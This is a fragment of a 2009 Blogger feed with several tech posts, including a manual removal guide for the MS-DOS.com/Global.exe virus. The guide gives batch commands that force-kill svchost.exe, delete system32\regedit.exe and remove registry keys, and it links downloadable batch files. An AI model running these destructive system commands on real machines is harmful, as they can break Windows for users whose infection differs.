+          "$t": "<a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikgvIzx58M04LonAGJVzSMoCbW6KtPZzHdWFOjXe7dgInJ2M-OzUhiWlygQJfYo8ZZ6RnrDmX4HQLjBd2yxNnO9cP0yMCqv6QHf86jJSvT63FWrtqOhQbe-Au4qyAR2Sqj92ARy4idgKj2/s1600-h/chuon-nat-khmer-dictionary2.0.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 43px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikgvIzx58M04LonAGJVzSMoCbW6KtPZzHdWFOjXe7dgInJ2M-OzUhiWlygQJfYo8ZZ6RnrDmX4HQLjBd2yxNnO9cP0yMCqv6QHf86jJSvT63FWrtqOhQbe-Au4qyAR2Sqj92ARy4idgKj2/s400/chuon-nat-khmer-dictionary2.0.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5350014410261646914\" border=\"0\" /></a><br />Let's try to distribute Khmer Dictionary to help all Khmer or people get to know Khmer language enjoy using our right dictionary than some dictionary that wrote wrong Khmer word...<br /><br />Here, it is <a href=\"http://www.snapdrive.net/files/583222/Software/KhmerDictionary2-ChuonNat.zip\"><span style=\"font-weight: bold;\">Chuon Nat Khmer Dictionary (Khmer to Khmer) 2.0 to download</span></a>.<br />The dictionary using Khmer Unicode so please download <a href=\"http://www.snapdrive.net/files/583222/Software/KhmerUnicode2.0.0.zip\">Khmer Unicode 2.0</a>.<br />The dictionary contains also the short explanation about Khmer Language Grammar.<br /><br />Thanks to <a href=\"http://www.budinst.gov.kh/?q=node/314\">Buddhist Institute of Cambodia</a>.<br /><br />You can find other related page for Khmer Dictionary:<br />1. http://code.google.com/p/khmer-dictionary-tools/<br />2. http://www.budinst.gov.kh/?q=node/314"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/6443479352666484948/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/06/chuon-nat-khmer-dictionary-20-with.html#comment-form",
+            "title": "1 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/6443479352666484948"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/6443479352666484948"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/06/chuon-nat-khmer-dictionary-20-with.html",
+            "title": "Chuon Nat - Khmer Dictionary 2.0 with Unicode font"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikgvIzx58M04LonAGJVzSMoCbW6KtPZzHdWFOjXe7dgInJ2M-OzUhiWlygQJfYo8ZZ6RnrDmX4HQLjBd2yxNnO9cP0yMCqv6QHf86jJSvT63FWrtqOhQbe-Au4qyAR2Sqj92ARy4idgKj2/s72-c/chuon-nat-khmer-dictionary2.0.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "1"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-5417023114987499813"
+        },
+        "published": {
+          "$t": "2009-06-11T21:44:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-06-11T23:15:42.869-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Browser"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Firefox"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Performance"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Optimizing the firefox 3.0.x for saving memories"
+        },
+        "content": {
+          "type": "html",
+          "$t": "Hum, I got so headache when using a slow computer so I have to find the issue... I know I have many programs installed on my system so these can be the problem but I use mostly the firefox for internet surfing...<br /><br />I start finding that anytime I open many firefox or tabs at the same it crashes me for a while to use other applications. Check in the process, yes firefox using much memory than others:<br /><div style=\"text-align: center;\"><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFMTM8LfcRTavX8c6H62HszAkqhUjb5rkDYjt0hMKQZIt3YSbdGJmOU9f1PnwQF0JgCKhrdCTfILP7qsPDjcpAee8WvppCUHGG4Vp6xrFxtJ24HAYSWJ_Yww1gXgSyh2KHWK6vrXxsiiBy/s1600-h/firefox_memory_process_before.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 384px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFMTM8LfcRTavX8c6H62HszAkqhUjb5rkDYjt0hMKQZIt3YSbdGJmOU9f1PnwQF0JgCKhrdCTfILP7qsPDjcpAee8WvppCUHGG4Vp6xrFxtJ24HAYSWJ_Yww1gXgSyh2KHWK6vrXxsiiBy/s400/firefox_memory_process_before.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5346302314169339506\" border=\"0\" /></a><br />Here is the process screen for firefox opens around 25 tabs<br /></div><br />Here the way I optimize the firefox configuration:<br /><span style=\"font-weight: bold;\">I.</span> Type <span style=\"font-weight: bold;\">about:config</span> on firefox address box<br /><span style=\"font-weight: bold;\">II.</span> Session cofingure:<br /><ol><li>search \"<span style=\"font-weight: bold;\">session</span>\" in filter box</li><li>Edit <span style=\"font-weight: bold;\">browser.sessionhistory.max_entries</span> – this is the number of pages stored in the history of your browsing session. Basically these are pages that can be reached using your Back and Forward buttons. The default is 50, I reduced it to 20.</li><li>Edit <span style=\"font-weight: bold;\">browser.sessionhistory.max_total_viewers</span> – this is the number of pages that are stored in RAM so that they aren’t re-processed by Firefox’s rendering engine. This is what allows you to go Back to a page in Firefox and have it load almost instantaneously. The number of pages stored actually depends on the amount of RAM on your machine. I reduced this to 4 (I have 2GB RAM).</li><li>Edit <span style=\"font-weight: bold;\">browser.sessionstore.max_tabs_undo</span> – the number of tabs you can restore after closing them (you can do this with Ctrl/Cmd-Shift-T). The default of 10 is more than I really need, so I reduced it to 5 tabs.</li><li>Edit <span style=\"font-weight: bold;\">browser.sessionstore.interval</span> – Firefox saves your session after every 10 seconds by default. I changed this to a more conservative 30000 milliseconds.</li></ol><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj85gtGE-nykNzVDoHx5IajDk_GgcgsYhTqArmqxpAlO65VhYtfNKTaFZxIc7Zf-KJZSwHp0sYfa68KkUobdXK-UlREqB5Zd5JZR-5AieOGe0VqCmxNj-b-COa77xX_CaoNCBXcBEqw_2Wt/s1600-h/firefox_about_config_session_optimize.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 102px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj85gtGE-nykNzVDoHx5IajDk_GgcgsYhTqArmqxpAlO65VhYtfNKTaFZxIc7Zf-KJZSwHp0sYfa68KkUobdXK-UlREqB5Zd5JZR-5AieOGe0VqCmxNj-b-COa77xX_CaoNCBXcBEqw_2Wt/s400/firefox_about_config_session_optimize.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5346320322928323234\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">III.</span> Network configuration:  enable these  to get faster network speed<ol><li><span style=\"font-weight: bold;\">network.http.pipelining</span> => true</li><li><span style=\"font-weight: bold;\">network.http.pipelining.ssl</span> => true</li><li><span style=\"font-weight: bold;\">network.http.proxy.pipelining</span> => true</li></ol><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinhkk5YyVoNll6XA_jdiGG6R-On3kKJveoGc3xtWMep91M0gAk2jo72f8KTZ6V2OBAt5TDRMGM10uRRYHaVr1A3GODGz59ivlkVd0lC8tqU1PK1Pi8EVKkUJgnowYOfT9PiE7mYwJJnR-S/s1600-h/firefox_about_config_network_optimize.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 74px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinhkk5YyVoNll6XA_jdiGG6R-On3kKJveoGc3xtWMep91M0gAk2jo72f8KTZ6V2OBAt5TDRMGM10uRRYHaVr1A3GODGz59ivlkVd0lC8tqU1PK1Pi8EVKkUJgnowYOfT9PiE7mYwJJnR-S/s400/firefox_about_config_network_optimize.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5346320744009582146\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">IV.</span>  Release Memory When Firefox Minimized<br /><ol><li>Right click at the content (anywhere) and choose<span style=\"font-weight: bold;\"> New->Boolean</span>.</li><li>In the textbox, type <span style=\"font-weight: bold;\">config.trim_on_minimize</span> and press <span style=\"font-weight: bold;\">OK</span>.</li><li>Set the value to <span style=\"font-weight: bold;\">true</span>, and press OK</li></ol><span style=\"font-weight: bold;\">V.</span> Restart firefox to take affection.<br /><br />Here is the result of the process after optimize:<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4yDGGj8fnryZYSQFajby7TKIJHmgcgh8WKDA5OVo1J6d3CQxRzlk3EWozFO7DEQexJlJsb4BBNCy0fSPKmlXd7PSPZinziglLZj_jO6PQQjE-GkjpsbljOcP2jxeNpGAq5VHAEhItRE3V/s1600-h/firefox_memory_process_after.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 384px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4yDGGj8fnryZYSQFajby7TKIJHmgcgh8WKDA5OVo1J6d3CQxRzlk3EWozFO7DEQexJlJsb4BBNCy0fSPKmlXd7PSPZinziglLZj_jO6PQQjE-GkjpsbljOcP2jxeNpGAq5VHAEhItRE3V/s400/firefox_memory_process_after.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5346316883176941682\" border=\"0\" /></a><br />So seem it helps, so much different, isn't it? :)<br />Thanks to following posts also:<br /><ol><li>http://support.mozilla.com/en-US/kb/high+memory+usage</li><li>http://blog.codefront.net/2008/09/10/optimize-firefoxs-memory-usage-by-tweaking-session-preferences/</li><li>http://www.go4expert.com/forums/showthread.php?t=8568<br /></li></ol><br />Enjoy!"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/5417023114987499813/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/06/optimizing-firefox-30x-for-saving.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5417023114987499813"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5417023114987499813"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/06/optimizing-firefox-30x-for-saving.html",
+            "title": "Optimizing the firefox 3.0.x for saving memories"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFMTM8LfcRTavX8c6H62HszAkqhUjb5rkDYjt0hMKQZIt3YSbdGJmOU9f1PnwQF0JgCKhrdCTfILP7qsPDjcpAee8WvppCUHGG4Vp6xrFxtJ24HAYSWJ_Yww1gXgSyh2KHWK6vrXxsiiBy/s72-c/firefox_memory_process_before.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-5536369499991799140"
+        },
+        "published": {
+          "$t": "2009-06-07T20:27:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-06-07T23:07:56.155-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Bing"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Search Engine"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Welcome to Bing, live search engine"
+        },
+        "content": {
+          "type": "html",
+          "$t": "<a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://www.bing.com\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 247px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2UKVWzROhZgURRLNJkjlxGCWIFZPgV3ATQSUNUzHH582RekmpiwO9JpZj2mqqe8o_6yciIP_Jrn3gOS83xVUinUzgfrz7vaD-HNsUqbOOfhyXKx4jIylkWMBEkvnnFcvW80ZlGwq6lK7N/s400/bing.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5344800252250250130\" border=\"0\" /></a><br />Recently, Microsoft has released a new live search engine called Bing (<a href=\"http://www.bing.com/\">www.bing.com</a>) (formerly <b>Live Search</b>, <b>Windows Live Search</b> and <b>MSN Search</b>), the question for us is will Bing become a popular search engine as or over Google  (<a href=\"http://www.google.com/\">www.google.com</a>)?<br /><br />So this question will see during the long way, I think most people when they meet any issue or require some information, they always remember google than other search engine as yahoo etc. but now as bing become a good one of live search engine so the competition should be starting now.<br /><br />Bing released online on June 3, 2009 according to the <a href=\"http://en.wikipedia.org/wiki/Live_Search\">Wiki Pedia</a> record and it has now 16% of statistics counting since it's online till now, it's still a small percentage if compare to google of 60% but see, how fast they are popular now.<br /><br />Any way, welcome to the new competition of search engine!"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/5536369499991799140/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/06/welcome-bing-live-search-engine.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5536369499991799140"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5536369499991799140"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/06/welcome-bing-live-search-engine.html",
+            "title": "Welcome to Bing, live search engine"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2UKVWzROhZgURRLNJkjlxGCWIFZPgV3ATQSUNUzHH582RekmpiwO9JpZj2mqqe8o_6yciIP_Jrn3gOS83xVUinUzgfrz7vaD-HNsUqbOOfhyXKx4jIylkWMBEkvnnFcvW80ZlGwq6lK7N/s72-c/bing.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-4673756919437371961"
+        },
+        "published": {
+          "$t": "2009-01-13T19:26:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2009-01-13T19:29:32.183-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Errors"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "News"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Programming"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Security"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "[NEWS] THE TOP 25 MOST DANGEROUS PROGRAMMING ERRORS"
+        },
+        "content": {
+          "type": "html",
+          "$t": "<div class=\"mva\">Here is the list of the top 25 most dangerous programming errors to be notified by all programmers:<br /><ol><li>CWE-20:Improper Input Validation</li><li>CWE-116:Improper Encoding or Escaping of Output </li><li>CWE-89:Failure to Preserve SQL Query Structure</li><li>CWE-79:Failure to Preserve Web Page Structure </li><li>CWE-78:Failure to Preserve OS Command Structure </li><li>CWE-319:Cleartext Transmission of Sensitive Information</li><li>CWE-352:Cross-Site Request Forgery</li><li>CWE-362:Race Condition </li><li>CWE-209:Error Message Information Leak </li><li>CWE-119:Failure to Constrain Operations within the Bounds of a Memory Buffer </li><li>CWE-642:External Control of Critical State Data </li><li>CWE-73:External Control of File Name or Path</li><li>CWE-426:Untrusted Search Path</li><li>CWE-94:Failure to Control Generation of Code</li><li>CWE-494:Download of Code Without Integrity Check </li><li>CWE-404:Improper Resource Shutdown or Release </li><li>CWE-665:Improper Initialization </li><li>CWE-682:Incorrect Calculation </li><li>CWE-285:Improper Access Control </li><li>CWE-327:Use of a Broken or Risky Cryptographic Algorithm </li><li>CWE-259:Hard-Coded Password </li><li>CWE-732:Insecure Permission Assignment for Critical Resource </li><li>CWE-330:Use of Insufficiently Random Values </li><li>CWE-250:Execution with Unnecessary Privileges </li><li>CWE-602:Client-Side Enforcement of Server-Side Security </li></ol>                                                                           <div class=\"bull\"><i>Source: SANS Institute<br />News Source: <a href=\"http://news.bbc.co.uk/2/hi/technology/7824939.stm\">Dangerous coding errors revealed </a><br /></i> </div>   </div>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/4673756919437371961/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/01/news-top-25-most-dangerous-programming.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/4673756919437371961"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/4673756919437371961"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/01/news-top-25-most-dangerous-programming.html",
+            "title": "[NEWS] THE TOP 25 MOST DANGEROUS PROGRAMMING ERRORS"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-5371130614556363797"
+        },
+        "published": {
+          "$t": "2009-01-04T20:36:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2009-03-26T22:29:46.103-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Antivirus"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "How to kill Virus"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Virus"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "How to kill virus: MS-DOS.com, Global.exe, system.exe, svchost.exe manually"
+        },
+        "content": {
+          "type": "html",
+          "$t": "The virus: MS-DOS.com which in the process we can see it as Global.exe, system.exe and svchost.exe (which confused to the system process) which are the main process of the virus.<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://fongthai.files.wordpress.com/2008/05/i-got-hacked.png\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 382px; height: 157px;\" src=\"http://fongthai.files.wordpress.com/2008/05/i-got-hacked.png\" alt=\"\" border=\"0\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />I used to met them with my friends' PC but I could not do anything other than format their PC as most of the antivirus seem can't heal it after the PC affected but now it's with my PC and I don't want to format it again, I tried to kill it myself without any information of it for almost 2 days but I got nothing.<br /><br />After research, I got some solutions that possible to try, thanks to:<br /><ul><li><a href=\"http://www.pandasecurity.com/homeusers/security-info/about-malware/encyclopedia/overview.aspx?lst=det&amp;idvirus=193263\">Panda Security</a> </li><li><a href=\"http://fongthai.wordpress.com/2008/06/23/perwall-worm_autorunbuk-sillyfdc-virus-globalexe/\">FontThai blog</a></li><li>Vietnamese blog: <a href=\"http://translate.google.com/translate?hl=en&amp;ie=UTF-8&amp;u=http%3A%2F%2Fwww.lecuong.info%2Fblog%2Fread.php%2F56.htm&amp;sl=vi&amp;tl=en&amp;history_state0=\">lecuong.info</a> (I used google translator)</li></ul>With  <a href=\"http://translate.google.com/translate?hl=en&amp;ie=UTF-8&amp;u=http%3A%2F%2Fwww.lecuong.info%2Fblog%2Fread.php%2F56.htm&amp;sl=vi&amp;tl=en&amp;history_state0=\">lecuong.info</a> solution seem more closely to solve the issue:<!--[if gte mso 9]><xml>  <w:worddocument>   <w:view>Normal</w:View>   <w:zoom>0</w:Zoom>   <w:hyphenationzone>21</w:HyphenationZone>   <w:punctuationkerning/>   <w:validateagainstschemas/>   <w:saveifxmlinvalid>false</w:SaveIfXMLInvalid>   <w:ignoremixedcontent>false</w:IgnoreMixedContent>   <w:alwaysshowplaceholdertext>false</w:AlwaysShowPlaceholderText>   <w:compatibility>    <w:breakwrappedtables/>    <w:snaptogridincell/>    <w:wraptextwithpunct/>    <w:useasianbreakrules/>    <w:dontgrowautofit/>    <w:usefelayout/>   </w:Compatibility>   <w:browserlevel>MicrosoftInternetExplorer4</w:BrowserLevel>  </w:WordDocument> </xml><![endif]--><!--[if gte mso 9]><xml>  <w:latentstyles deflockedstate=\"false\" latentstylecount=\"156\">  </w:LatentStyles> </xml><![endif]--><style> <!--  /* Font Definitions */  @font-face  {font-family:SimSun;  panose-1:2 1 6 0 3 1 1 1 1 1;  mso-font-alt:宋体;  mso-font-charset:134;  mso-generic-font-family:auto;  mso-font-pitch:variable;  mso-font-signature:3 135135232 16 0 262145 0;} @font-face  {font-family:\"\\@SimSun\";  panose-1:2 1 6 0 3 1 1 1 1 1;  mso-font-charset:134;  mso-generic-font-family:auto;  mso-font-pitch:variable;  mso-font-signature:3 135135232 16 0 262145 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal  {mso-style-parent:\"\";  margin:0cm;  margin-bottom:.0001pt;  mso-pagination:widow-orphan;  font-size:10.0pt;  font-family:\"Times New Roman\";  mso-fareast-font-family:SimSun;  mso-ansi-language:EN-US;  mso-bidi-language:HE;} @page Section1  {size:612.0pt 792.0pt;  margin:72.0pt 90.0pt 72.0pt 90.0pt;  mso-header-margin:36.0pt;  mso-footer-margin:36.0pt;  mso-paper-source:0;} div.Section1  {page:Section1;} --> </style><!--[if gte mso 10]> <style>  /* Style Definitions */  table.MsoNormalTable  {mso-style-name:\"Table Normal\";  mso-tstyle-rowband-size:0;  mso-tstyle-colband-size:0;  mso-style-noshow:yes;  mso-style-parent:\"\";  mso-padding-alt:0cm 5.4pt 0cm 5.4pt;  mso-para-margin:0cm;  mso-para-margin-bottom:.0001pt;  mso-pagination:widow-orphan;  font-size:10.0pt;  font-family:\"Times New Roman\";  mso-ansi-language:#0400;  mso-fareast-language:#0400;  mso-bidi-language:#0400;} </style> <![endif]--><span style=\";font-family:&quot;;font-size:12;\"  ><span style=\"font-weight: bold;\"></span></span><br /><span style=\"font-weight: bold;\">B1</span>: Use IceSword simultaneously kill 3 Process: system.exe, Global.exe, svchost.exe<br /><span style=\"font-weight: bold;\">B2</span>: Find and delete all the files have been analyzed at above<br /><span style=\"font-weight: bold;\">B3</span>: Using Autoruns to check &amp; remove all key viruses created in the registry<br /><span style=\"font-weight: bold;\">B4</span>: Reboot computer.<br /><span style=\"font-weight: bold;\">B5</span>: Download antivirus program (such <a href=\"http://www.bkav.com.vn/home/MuatheBkav2.aspx?d=9\">bkav</a>) to scan again! (If the computer has antivirus program is removed and then installed again!)<br /><span style=\"font-weight: bold;\">B6</span>: Open Run -> CMD: type in <span style=\"font-weight: bold;\">sfc /scannow</span> or <span style=\"font-weight: bold;\">sfc /scanonce</span> and XP disk to correct the file failed.<br /><span style=\"font-weight: bold;\">B7</span>: Reboot computer. (If necessary)<br /><br />With solution <span style=\"font-weight: bold;\">B2/ B3/</span> please use batch file to do it: (<a href=\"http://www.snapdrive.net/files/583222/Software/kill-msdos%20from%20lecuong.info.zip\">kill-msdos.zip</a>)<br />But I recommend you to use another batch file below...<br /><br />As for sure, everyone will difficult for point <span style=\"font-weight: bold;\">B1/</span> so I, myself tried to enhance on lecuong.info batch to add following command to try ending all processes of the virus:<br /><br /><span style=\"color: rgb(204, 0, 0);\">taskkill /F /IM system.exe /IM Global.exe /IM svchost.exe /T</span><br /><br />But we will face delete also svchost.exe which is the windows system one so that in 1 minute the PC will shutdown but don't worry, we can proceed the rest before 1 minute.<br /><br />Please press any key and accept YES by press <span style=\"font-weight: bold;\">Y </span>to confirm delete all virus files and regedit entries as in the batch.<br /><br />As I face the virus, seem the batch needs to enhance for more file paths to delete such as:<br />c:\\windows\\system32\\regedit.exe and its regedit entries so here what I added more:<br /><br /><span style=\"color: rgb(255, 0, 0);\">ATTRIB -R -H -S -A c:\\windows\\system32\\regedit.exe</span><br /><br /><span style=\"color: rgb(255, 0, 0);\">DEL /f c:\\windows\\system32\\regedit.exe</span><br /><br /><span style=\"color: rgb(255, 0, 0);\">REG DELETE \"HKEY_CURRENT_USER\\Software\\Microsoft\\Search Assistant\\ACMru\\5603\" </span><span style=\"color: rgb(255, 0, 0);\">/v \"001\" /F</span><br /><span style=\"color: rgb(255, 0, 0);\">REG DELETE \"HKEY_CLASSES_ROOT\\MSCFile\\Shell\\Open\\Command\" /f</span><br /><br />Now I don't see any process of this virus on my task manager any more.<br /><br /><blockquote>(<span style=\"font-weight: bold;\">DOWNLOAD</span>)<br />Here is the full batch file:<a href=\"http://www.snapdrive.net/files/583222/Software/kill-msdos-full%20%28computerexperience.co.cc%29.zip\"><br />kill-msdos-full (computerexperience.co.cc).zip</a></blockquote><br /><br />Don't forget to continue point B5/ and B6/ also.<br /><br />Please report any issue/success related to this solution."
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/5371130614556363797/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/01/how-to-kill-virus-ms-doscom-globalexe.html#comment-form",
+            "title": "6 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5371130614556363797"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5371130614556363797"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/01/how-to-kill-virus-ms-doscom-globalexe.html",
+            "title": "How to kill virus: MS-DOS.com, Global.exe, system.exe, svchost.exe manually"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "6"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-6513108341502746120"
+        },
+        "published": {
+          "$t": "2008-12-26T02:17:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2009-06-10T00:04:28.963-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "C#"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
